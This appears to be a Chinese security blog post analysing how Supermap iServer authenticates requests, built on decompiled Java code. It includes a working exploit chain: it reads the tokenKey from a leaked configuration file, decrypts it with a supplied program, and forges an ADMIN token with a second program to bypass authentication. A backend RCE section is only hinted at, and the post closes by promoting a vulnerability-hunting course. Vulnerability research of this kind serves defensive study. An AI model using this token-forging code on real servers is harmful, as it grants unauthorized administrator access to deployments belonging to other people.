#  Supermap iServer历史漏洞浅析(下)  
原创 路人甲
                    路人甲  红细胞安全实验室   2026-03-31 02:19  
  
   
  
## 权限绕过  
  
在上一篇文章中我们提及到有文件读取漏洞的基础上，我们可以读取iserver  
的配置文件WEB-INF/iserver-system.xml  
以及数据库文件WEB-INF/iserver-security.db  
来实现获取Token  
。在配置文件中存在很多关键配置信息，其中就包含了我们所需的tokenkey  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnxWZtdADJuHRU7jFoo4eAWuib4NtJkw5JibtdpnlkbibibAHJvjeISbjLDe7ztGhAqLeeFr7109h1iaK8y6siczDXCM7AAFEZ7iaZReQ/640?wx_fmt=png&from=appmsg "")  
  
iserver  
的主要鉴权逻辑发生在com.supermap.server.host.webapp.handlers.SecurityHandler#handle  
方法里面，这里的com.supermap.server.host.webapp.handlers.SecurityHandler#doAuthenticateAndAuthorizate  
是主要鉴权方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xl7bvam2aRZWlyuiaKtB8mKo7cH7jKbwF9hGicSvAS2kSdsEqQ7TsqPyLn90KQa4picBick7GQP7yHUYXQQ2AtqP9u6dhxqKw3T9bc/640?wx_fmt=png&from=appmsg "")  
  
其底层会调用com.supermap.services.security.MyShiroFilter#shiroFilterInternal  
通过shiro  
进行鉴权过滤，不过这里在通过规则过滤请求的时候会获取当前请求身份信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xksic3UNqQEO9x3ZTlu1co2pqQgzaBer9L7hDxfpHJvvBbsvMhibb2BiayN1IvfKtol13oEQK5ZxhGbRv7CGthbEP1tcia763EA960/640?wx_fmt=png&from=appmsg "")  
```
      protected WebSubject createSubject(ServletRequest servletRequest, ServletResponse servletResponse) {        HttpServletRequest var3 = (HttpServletRequest)servletRequest;        HttpServletResponse var4 = (HttpServletResponse)servletResponse;        WebSubject var5 = this.c.create(var3, var4, this.getSecurityManager());        if (var5 != null) {            return var5;        } else {            // 从请求头或参数、cookie等地方获取凭据信息            String var6 = TokenRequestUtil.getToken(var3);            if (!StringUtils.isNotEmpty(var6)) {                WebSubject var17 = super.createSubject(var3, var4);                if (!SecurityUtility.isLogin(var3) && !var17.isAuthenticated() && !var17.isRemembered() && !StringUtils.startsWith(AbstractHandler.getPathInfo(var3), "/shiro-cas")) {                    ShiroUtil.loginAsGuest(var3, var4, var17);                    return (WebSubject)ThreadContext.getSubject();                } else {                    return var17;                }            } else {                // 先尝试JWT解码获取凭据信息（主要针对于启用KeyCloak的场景）                JsonWebSignature var7 = JwtUtil.getJsonWebSignature(var6);                if (var7 != null) {                    KeycloakConfig var8 = Manager.getInstance().getKeycloakConfig();                    JwkUtil var9 = JwkUtil.getInstance();                    Optional var10 = Optional.empty();                    if (StringUtils.equals(var7.getHeader("kid"), var9.getJwkId())) {                        var10 = JwtUtil.decodeJwt(var6, var9.getPublicKey(), var7.getHeader("alg"), "https://www.supermap.com", 0, var3);                    } else if (var8.isEnable()) {                        var10 = JwtUtil.decodeJwtFromKeycloak(var8, var7, var6);                    }                    if (var10.isPresent()) {                        if (StringUtils.endsWith(var3.getRequestURI(), "/web/config/userprofile.json") && !StringUtils.equals(var7.getHeader("kid"), var9.getJwkId())) {                            var6 = this.a(var6, var8);                            var7 = JwtUtil.getJsonWebSignature(var6);                            var10 = JwtUtil.decodeJwtFromKeycloak(var8, var7, var6);                            KeycloakOidcProfile var11 = new KeycloakOidcProfile();                            var10.ifPresent((var1) -> var1.getClaimsMap().forEach(var11::addAttribute));                            CommonProfile var12 = this.d.generate((WebContext)null, var11);                            LinkedHashMap var13 = new LinkedHashMap();                            var13.put("KeycloakOidcProfile", var12);                            Pac4jToken var14 = new Pac4jToken(var13, true);                            ShiroUtil.getSubject(var3, var4).login(var14);                        } else {                            TokenRequestUtil.login(var3, var4, (JwtClaims)var10.get());                        }                    }                } else {                    // 解密获取凭据信息                    TokenInfo var18 = TokenUtil.getInstance().getTokenInfo(var6);                    TokenRequestUtil.login(var3, var4, var18);                }                return (WebSubject)ThreadContext.getSubject();            }        }    }    //  获取凭据信息    public static String getToken(HttpServletRequest request) {        TOKEN_STR = Tool.getTokenName();        if (request.getHeaderNames() != null) {            Enumeration var1 = request.getHeaderNames();            while(var1.hasMoreElements()) {                String var2 = (String)var1.nextElement();                if (org.apache.commons.lang3.StringUtils.equalsIgnoreCase("Authorization", var2)) {                    String var3 = request.getHeader(var2);                    if (org.apache.commons.lang3.StringUtils.isNotBlank(var3)) {                        String var4 = org.apache.commons.lang3.StringUtils.replaceIgnoreCase(var3, "Bearer", "").trim();                        if (org.apache.commons.lang3.StringUtils.isNotBlank(var4)) {                            return var4;                        }                    }                }            }        }        String var7 = request.getQueryString();        String var8 = getTokenFromQueryString(var7);        if (var8 != null) {            return var8;        } else {            if (request.getCookies() != null) {                for(Cookie var6 : request.getCookies()) {                    if (org.apache.commons.lang3.StringUtils.equalsIgnoreCase(var6.getName(), TOKEN_STR)) {                        var8 = var6.getValue();                        if (org.apache.commons.lang3.StringUtils.isNotEmpty(var8)) {                            return var8;                        }                    }                }            }            if (request.getHeaderNames() != null) {                Enumeration var10 = request.getHeaderNames();                while(var10.hasMoreElements()) {                    String var12 = (String)var10.nextElement();                    if (TOKEN_STR.equals(var12)) {                        var8 = request.getHeader(var12);                        if (org.apache.commons.lang3.StringUtils.isNotEmpty(var8)) {                            return var8;                        }                    }                }            }            return var8;        }    }
```  
  
在这个方法里面如果是通过JWT  
的方式解码获取身份信息失败的话会尝试调用com.supermap.services.security.TokenUtil#getTokenInfo  
方法获取身份信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnhH984YaTmMagQhibWwicYnAOp3OKmeFpSib2oZK8yVtnuX3A57CGxYE1naZNxicXU0ddwMQZLarauH8qraqBNeZbzvSSlBwQmOPw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xnktibr8B64tu68MwrQM0kGOXDT5IcwfD0RroBCmh9e6h5MDpScXOTav71YxJxPfeFUnKgEIqaHXibFUJRRtxjDEbUKHUUOvquBI/640?wx_fmt=png&from=appmsg "")  
  
通过解密token  
并解析获取身份信息  
```
    public TokenInfo getTokenInfo(String token) {        String var2 = this.getTokenKey();        if (var2 == null) {            d.info(c.getMessage(SecurityManageResource.TOKENUTIL_HAVENOT_SET_TOKENKEY, new Object[0]));            return null;        } else {            AESCipher var3 = new AESCipher(var2);            try {                String var4 = var3.decrypt(token);                return this.a(var4);            } catch (SecurityException var5) {                d.debug(var5.getMessage(), var5);                return null;            } catch (UnsupportedEncodingException var6) {                d.debug(var6.getMessage(), var6);                return null;            }        }    }    public String getTokenKey() {        return this.b;    }    public void setTokenKey(String key) {        if (!StringUtils.isEmpty(key)) {            d.debug(String.format("TokenUtil.change tokenKey from %s to %s", this.b, key));            this.b = key;        } else {            throw new IllegalArgumentException(c.getMessage(SecurityManageResource.TOKENUTIL_TOKENKEY_NULL_OR_ZERO_LENGTH, new Object[0]));        }    }    public AESCipher(String key) throws SecurityException {        this(key, false);    }    public String decrypt(String str) throws SecurityException, UnsupportedEncodingException {        try {            Cipher var2 = this.c();            if (str == null) {                throw new SecurityException("Decrypt string is null");            } else {                String var3 = str.replace('_', '/').replace('-', '+').replace('.', '=');                byte[] var4 = Base64.decodeBase64(var3.getBytes());                byte[] var5 = var2.doFinal(var4);                return new String(var5, "UTF8");            }        } catch (Exception var6) {            throw new SecurityException("Could not decrypt: " + var6.getMessage(), var6);        }    }    private TokenInfo a(String var1) {        if (!StringUtils.isEmpty(var1)) {            // 以特定字符串'#;_&_&;#'切割            String[] var2 = var1.split("#;_&_&;#");            if (var2.length != 4) {                d.info(c.getMessage(SecurityManageResource.TOKENUTIL_RESERVETOKENINFO_TOKEN_INVALID_LENGTH, new Object[0]));                return null;            } else {                // 构造Token信息                TokenInfo var3 = new TokenInfo();                var3.userName = var2[0];                try {                    var3.expirationTimeMillis = Long.valueOf(var2[1]);                } catch (NumberFormatException var7) {                    d.info(c.getMessage(SecurityManageResource.TOKENUTIL_RESERVETOKENINFO_TOKEN_INVALID_EXPIRATIONDATE, new Object[0]));                    return null;                }                Object var4 = null;                try {                    var8 = (ClientIdentifyType)ClientIdentifyType.valueOf(ClientIdentifyType.class, var2[2]);                } catch (IllegalArgumentException var6) {                    d.info(c.getMessage(SecurityManageResource.TOKENUTIL_RESERVETOKENINFO_TOKEN_INVALID_CLIENTTYPE, new Object[0]));                    d.debug(var6.getMessage(), var6);                    return null;                }                var3.clientType = var8;                if (ClientIdentifyType.Referer.equals(var8)) {                    var3.refererURL = var2[3];                } else if (ClientIdentifyType.IP.equals(var8)) {                    var3.ip = var2[3];                }                return var3;            }        } else {            d.info(c.getMessage(SecurityManageResource.TOKENUTIL_RESERVETOKENINFO_TOKEN_NULL_OR_ZERO_LENGTH, new Object[0]));            return null;        }    }
```  
  
通过前面解密获取到Token  
信息后会调用com.supermap.services.security.TokenRequestUtil#login  
方法登录相关的用户并且设置上下文信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmI4ib6yWbowmAEfJ9MdH1Ov5UG7UD8icjcewNb0a6OwrnF3mZibL4pibF07hqYnIib0JcnSpFnicQHZ0VYTcjwvicf8tErdra04VRDGU/640?wx_fmt=png&from=appmsg "")  
```
    public static void login(HttpServletRequest request, HttpServletResponse response, TokenInfo tokenInfo) {        if (tokenInfo == null) {            throw new HttpException(Status.CLIENT_ERROR_UNAUTHORIZED, a.getMessage(SecurityManageResource.EXTRAINFOFILTER_TOKEN_INVALID, new Object[0]));        } else {            UsernamePasswordToken var3 = a(request, tokenInfo);            a(request, response, var3);        }    }    static UsernamePasswordToken a(HttpServletRequest var0, TokenInfo var1) {        if (var1 == null) {            throw new HttpException(Status.CLIENT_ERROR_UNAUTHORIZED, a.getMessage(SecurityManageResource.EXTRAINFOFILTER_TOKEN_INVALID, new Object[0]));        } else {            String var2 = var1.userName;            if (org.apache.commons.lang3.StringUtils.isNotEmpty(var1.ip)) {                String var3 = var0.getRemoteHost();                if (!var1.ip.equals(var3)) {                    throw new HttpException(Status.CLIENT_ERROR_UNAUTHORIZED, a.getMessage(SecurityManageResource.EXTRAINFOFILTER_TOKEN_INVALID, new Object[0]));                }            } else if (org.apache.commons.lang3.StringUtils.isNotEmpty(var1.refererURL)) {                String var4 = var0.getHeader("referer");                if (org.apache.commons.lang3.StringUtils.isEmpty(var4) || !var4.startsWith(var1.refererURL)) {                    throw new HttpException(Status.CLIENT_ERROR_UNAUTHORIZED, a.getMessage(SecurityManageResource.EXTRAINFOFILTER_TOKEN_INVALID, new Object[0]));                }            }            // token有效性判断            if (System.currentTimeMillis() > var1.expirationTimeMillis) {                throw new HttpException(Status.CLIENT_ERROR_UNAUTHORIZED, a.getMessage(SecurityManageResource.EXTRAINFOFILTER_TOKEN_INVALID, new Object[0]));            } else {                // 构造token                return (new BuiltInToken(var2)).principal(getToken(var0), "digestrealm").permission(new String[]{"denied:webmanager"}).lookupPermission(true).lookupRole(true);            }        }    }    private static void a(HttpServletRequest var0, HttpServletResponse var1, UsernamePasswordToken var2) {        ShiroUtil.login(var0, var1, var2);        Subject var3 = SecurityUtils.getSubject();        var0.setAttribute("subject", var3);        var0.setAttribute("logout", "true");    }    public static void login(HttpServletRequest request, HttpServletResponse response, UsernamePasswordToken usernamePasswordToken) {        Subject var3 = getSubject(request, response);        a(var3, request, usernamePasswordToken);    }
```  
  
可以看到这里有个关键值就是这个TokenKey  
，也就是AES  
密钥，它的来源位于com.supermap.server.host.webapp.handlers.SecurityHandler#d  
方法，也就是Supermap iServer  
配置文件里面的tokenKey  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnFGN4cWNcBwC5bic47rertzNGG5IjmlmRl2GSRp5BwicleqPN3vgy0jev9A9AqyEQyL7edhlU0x8sg96tWRr6zTU6KBy2C1XSLE/640?wx_fmt=png&from=appmsg "")  
  
之所以是配置文件里面的tokenKey  
原因是这个SecuritySetting  
本质上就是从iserver-system.xml  
解析得到的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XleCVKvCticNCpzE6GOmw0VXtJmznXOPey6QpdBRSrOhiczGWCRtVUWicic7lS54RvXqC7dnGtUMmwOdKTRSibe0lBuxOD27iaBT6LEg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xk5tPa0ePW9JucnGyBSWGc0Ycbq9K3MHLkO2SOEGvN8NAxqvRITTZTOrx9Z7QcHjXcRANcqkaN9ww8eG8JNgiaeLsKsjZvIf8f4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xmp6GTW1D6P8I0EpVUM1jficHNSkibao3zJwQcovV0uRiaOES4MaGeickdRwgwlfFCj4af5vVXGcAnVTTsNws2A9vTbvGiaJTFiaOqms/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XmGLw3ia6JhLhpPPez42ia9H5AG7up95CysJDzib8qALFW3UYrGb5v2cun3TI8HAFRAbQibW0y6VicLK9Ng4fAlI4EzXBp8u22RFf84/640?wx_fmt=png&from=appmsg "")  
  
以上便是我们要拿到tokenkey  
的原因，因为有了它我们便可以自己构造身份信息，这里尝试构造了一个凭据信息可以看到进入触发如下调用，成功构造出了身份信息了也就实现了权限绕过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlibA5sW904DiawiciaXRBYKJxoVNMpuv7uf6sIdM2oYwJSWr02Sgbx2yDicwh7CjeeOCv0SydXkuJs4R5vO1vLQcRLMqHo1TVmVMy8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xn7uoX4ich79QJiciaficzibWqMUyibPveeAMuhvXbc8GGkxNIeZPgsRgaaTE3TKg4k3Bzciasyx5sugF6t9nkoS6X0TyeVcSrARfoOCM/640?wx_fmt=png&from=appmsg "")  
  
通过前面分析我们知道有了tokenKey  
并可以实现权限绕过，在读取到配置文件并拿到tokenKey  
之后我们就可以通过如下代码自己构造凭据  
```
import com.supermap.services.util.AESCipher;import java.io.UnsupportedEncodingException;public class GenToken {    public static void main(String[] args) throws UnsupportedEncodingException {        long now = System.currentTimeMillis();        long oneDayLater = now + 24 * 60 * 60 * 1000;        // ADMIN是管理员名        String token="ADMIN#;_&_&;#"+oneDayLater+"#;_&_&;#NONE#;_&_&;#NONE";        // tokenkey        AESCipher var4 = new AESCipher("cd821aeb3eaa448ea3fc4a610f199f8a");        System.out.println(var4.encrypt(token));    }}
```  
  
不过实战读取的时候一般是加密的情况，如本文开头所示。在前面分析过tokenKey  
来自于com.supermap.server.config.impl.XMLConfigImpl#b(java.io.File)  
读取配置文件获取到的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xmhtojf9A0aRfNgMq88DNA89ngRibrOG61wAVHHC466yvicWKcEskDaPpScicVnyTO4HVHhbnY6j7EiaDvfruus9Iv4kGjwdoUhib1I/640?wx_fmt=png&from=appmsg "")  
  
这一块在启动阶段完成的初始化，我们想要获取解密后的tokenkey  
有两种方法，读取目标的配置信息把里面的加密tokenkey  
替换到自己本地iserver  
里面，然后debug  
查看解密后的tokenkey  
，相当于就是利用iserver  
自身解密功能把他当作一个解密工具，还有一种方法就是debug  
解密逻辑，这里在com.supermap.server.config.impl.SystemConfigParser#getSecuritySetting  
方法下断重启debug  
解密逻辑  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmSJrSe5g5k7e5qzVbkwtYqiczkvmYWoiaLgOgH5bIpibCgg7eMHbHmib7rfyf63f5wk62IbkFicwB8eFEfkFP0V2JQgsAWG3nvXyqY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkV6e8N10TZd7XCEeBzmV1MwZcE4HEzGzZMytoOD8YNic5QhDgK399FvDdwPZAowSC9512ovXNPTTiaM9hED6TgkCUwEj2goGbSI/640?wx_fmt=png&from=appmsg "")  
  
这里通过一步一步debug  
发现最终会调用com.supermap.services.util.StringEncryptionUtil#decrypt(java.lang.String)  
方法解密tokenKey  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkqA4RIgfUntj2OC4VPctfPCoaeYgJ6nC2u4a72qpsvFGef9BFCDkJNBiaeek0HwQcicW72iaIRZo5wRmY0rWibuAibbSBmuXmPYaA0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlcqDHY54ibqhkpmWicdR1B60Bh8fREof9nG8Ejib3hzOibiaOCKZuA5knbIInT3MvsK5ymxFXgZRAZdAK8MjTlIyn8P1Pn7zZcv5Bk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkFy8Mbog06Hcbnfgh0sN5ebxwbL1icvW1ZuR3ibdVWFLw4Tl90ETgNMhiaD7fX6NXSYK9V4a8PN98KdABdjJBzOxdzSCsSx4aCnI/640?wx_fmt=png&from=appmsg "")  
  
可以看到，当tokenKey  
是加密数据的时候会调用com.supermap.services.util.StringEncryptionUtil#a()  
方法创建解密器解密，其内部逻辑较为麻烦，实战场景建议直接写Java  
利用工具，引用其自身库解密，或者让AI  
进行代码转换  
  
这里给出解密示例  
```
import com.supermap.services.util.StringEncryptionUtil;public class TokenkeyDecrypt {    public static void main(String[] args) throws Exception {        System.out.println(StringEncryptionUtil.decrypt("ENC@[xxxx]"));    }}
```  
## 后台RCE  
  
SecurityHandler  
当中的逻辑懂的都懂  
## 最后  
  
本文当中所提及内容均来自实战代码审计班课程内容，关于该产品更加深入利用手法可以咨询课程  
  
顺便再推荐一下我师傅的代码审计课程。近期某统一认证产品的课程章节已结束，马上开启某报表的章节，感兴趣的朋友可以尽快加入。课程中包含各类产品最新补丁对应的 0day 漏洞（非水洞） 的挖掘与分析；过往课程也涵盖多款市面产品的 0day / 1day / nday 漏洞案例讲解。课程后续会持续更新推进，支持一次报名长期学习与答疑。适合真正对代码审计感兴趣、或想系统学习但缺少思路与方法体系的同学（如有其他目的请勿打扰）。对基础要求不高，能读懂代码即可，真正帮助你从只能读懂代码到找到问题。个人学习过程中受益良多，特此分享推荐给希望提升自己的朋友（非广告）。若有打扰，敬请见谅。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnnF02bRBS7ktALbn5FdrUrwYlqmyUiaBSTwRrEY95cyqF8gCje1iapVfP6Md77Eu1EJVvxHwE94FGHcuTicWGpia9hLG9Vj8Tq79o/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
  
